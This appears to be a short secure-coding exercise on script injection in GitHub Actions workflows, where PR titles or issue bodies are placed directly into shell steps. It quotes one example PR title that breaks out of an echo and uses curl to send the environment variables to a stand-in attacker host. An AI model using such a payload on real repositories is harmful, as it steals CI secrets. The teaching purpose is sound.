# Scenario: Script Injection

Your workflow uses GitHub context variables directly in `run:` steps. For example, it echoes the PR title or issue body. An attacker can create a PR with a title like:

```
title"; curl https://evil.com/steal -d "$(env)"; echo "
```

This breaks out of the echo command and executes arbitrary code.

**Your mission:** Sanitize all user-controlled inputs before using them in shell commands.
